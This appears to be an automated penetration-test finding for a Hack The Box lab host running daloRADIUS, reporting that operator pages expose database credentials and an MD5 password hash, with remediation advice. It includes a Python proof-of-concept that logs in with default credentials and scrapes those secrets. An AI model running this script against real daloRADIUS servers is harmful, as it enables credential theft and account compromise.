# Authenticated daloRADIUS Interface Exposes Database Credentials and User Password Hashes

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-03-06 19:38:15 UTC
**Target:** http://underpass.htb
**Endpoint:** /daloradius/app/operators/config-db.php, /daloradius/app/operators/mng-edit.php
**Method:** GET
**CWE:** CWE-201
**CVSS:** 7.6

## Description

Overview:
After operator authentication, the administrative interface disclosed highly sensitive credential material directly in web pages, including database connection credentials and user password-hash values. The exposed information can be harvested by any authenticated operator session and used for lateral movement and credential attacks.

Severity and CVSS (vector only):
High severity. CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L

Affected asset(s):
underpass.htb
daloRADIUS operator pages including:
- /daloradius/app/operators/config-db.php
- /daloradius/app/operators/mng-edit.php?username=svcMosh

Technical details:
The database configuration page returned pre-populated connection fields in the HTML response, including:
- CONFIG_DB_USER = steve
- CONFIG_DB_PASS = testing123
- CONFIG_DB_HOST = localhost
- CONFIG_DB_NAME = radius

Additionally, user management/edit pages disclosed password material and hash metadata for RADIUS accounts, including:
- password value shown as 412DD4759978ACFCC81DEAB01B382403
- associated attribute MD5-Password

This disclosure exposes secrets that should be masked, redacted, or separated by strict role controls. In practice, the leaked hash was crackable and enabled access to a valid system account.

Proof of concept:
Authenticate as operator, request the configuration and user-edit endpoints, and extract sensitive values directly from HTML form fields.

Impact:
Disclosure of database credentials and user password hashes enables credential theft, offline cracking, account compromise, and lateral movement into SSH/system access. This substantially increases blast radius after initial operator compromise.

## Impact

An attacker with operator-level web access can extract privileged database credentials and user password hashes, then reuse or crack them to compromise additional services. This can lead to full account takeover of backend users, unauthorized database access, and progression toward host-level compromise. The issue materially reduces defense-in-depth and accelerates post-auth exploitation chains.

## Technical Analysis

The application renders sensitive configuration and identity secrets in client-visible HTML as form values. Security boundaries are weakened because confidential secrets are not adequately protected at presentation layer, and sensitive fields are exposed in full rather than masked or withheld. This behavior enables straightforward scraping of credentials/hashes from authenticated responses.

Validated sensitive outputs:
- config-db.php contains CONFIG_DB_USER and CONFIG_DB_PASS in input values
- mng-edit.php for existing user includes MD5-Password metadata and hash value
- Exposed hash was successfully cracked, demonstrating practical exploitability and privilege pivot potential

Root cause pattern:
Excessive sensitive-data exposure to administrative clients, combined with weak credential handling for stored password material.

## Proof of Concept

1. Authenticate to operator portal at /daloradius/app/operators/login.php using a valid operator account.
2. Request /daloradius/app/operators/config-db.php.
3. Inspect HTML form fields and observe exposed values:
   CONFIG_DB_USER, CONFIG_DB_PASS, CONFIG_DB_HOST, CONFIG_DB_NAME.
4. Request /daloradius/app/operators/mng-edit.php?username=svcMosh.
5. Inspect HTML and observe password/hash-related fields, including MD5-Password and hash value.
6. Use extracted hash in an offline cracking workflow to demonstrate credential recovery feasibility.

```
import re
import requests

BASE = "http://underpass.htb"
LOGIN_PAGE = f"{BASE}/daloradius/app/operators/login.php"
DOLOGIN = f"{BASE}/daloradius/app/operators/dologin.php"
CFG_DB = f"{BASE}/daloradius/app/operators/config-db.php"
MNG_EDIT = f"{BASE}/daloradius/app/operators/mng-edit.php?username=svcMosh"

def login(session, username, password):
    r = session.get(LOGIN_PAGE, timeout=10)
    r.raise_for_status()
    m = re.search(r'name="csrf_token" type="hidden" value="([^"]+)"', r.text)
    if not m:
        raise RuntimeError("CSRF token not found")
    csrf = m.group(1)
    data = {
        "operator_user": username,
        "operator_pass": password,
        "location": "default",
        "csrf_token": csrf
    }
    session.post(DOLOGIN, data=data, allow_redirects=True, timeout=10)

def extract_config_db(html):
    def get(name):
        m = re.search(rf'name="{name}"[^>]*value="([^"]*)"', html)
        return m.group(1) if m else None
    return {
        "CONFIG_DB_USER": get("CONFIG_DB_USER"),
        "CONFIG_DB_PASS": get("CONFIG_DB_PASS"),
        "CONFIG_DB_HOST": get("CONFIG_DB_HOST"),
        "CONFIG_DB_NAME": get("CONFIG_DB_NAME")
    }

def main():
    s = requests.Session()
    login(s, "administrator", "radius")

    cfg = s.get(CFG_DB, timeout=10)
    cfg.raise_for_status()
    vals = extract_config_db(cfg.text)
    print("[+] Extracted DB settings:", vals)

    edit = s.get(MNG_EDIT, timeout=10)
    edit.raise_for_status()

    md5_attr = "MD5-Password" in edit.text
    m_hash = re.search(r'([A-Fa-f0-9]{32})', edit.text)
    print("[+] MD5-Password attribute present:", md5_attr)
    print("[+] Candidate hash:", m_hash.group(1) if m_hash else None)

if __name__ == "__main__":
    main()
```

## Remediation

1. Remove plaintext secret exposure from UI responses:
   return masked placeholders for sensitive values and require explicit privileged re-entry for modifications.
2. Enforce least-privilege RBAC for configuration pages:
   restrict access to credential-bearing pages to a minimal trusted admin subset.
3. Do not render password hashes in user-facing HTML:
   suppress password/hash attributes in management forms unless strictly required for backend-only operations.
4. Migrate weak password hashing:
   eliminate MD5-based password storage and migrate to modern adaptive hashing for applicable authentication domains.
5. Implement secrets management:
   store database credentials in server-side secret stores/environment, not in editable UI defaults.
6. Add audit logging and alerting:
   log access to sensitive configuration/user-credential pages and detect unusual retrieval patterns.
7. Rotate exposed credentials immediately:
   rotate DB credentials and affected user credentials/hashes and invalidate existing sessions.
